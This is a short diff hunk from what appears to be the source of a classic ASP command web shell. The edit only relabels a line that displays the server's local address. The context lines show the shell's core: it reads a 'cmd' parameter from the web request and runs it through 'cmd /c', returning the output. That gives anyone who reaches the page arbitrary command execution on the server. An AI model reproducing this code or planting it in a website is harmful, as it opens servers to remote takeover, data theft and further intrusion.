@@ -39,7 +39,7 @@ end Function
 <%Response.Write(Request.ServerVariables("server_software"))%>
 </p>
 <p>
-<b>The server's software:</b>
+<b>The server's local address:</b>
 <%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
 <% szCMD = request("cmd")
 thisDir = getCommandOutput("cmd /c" & szCMD)
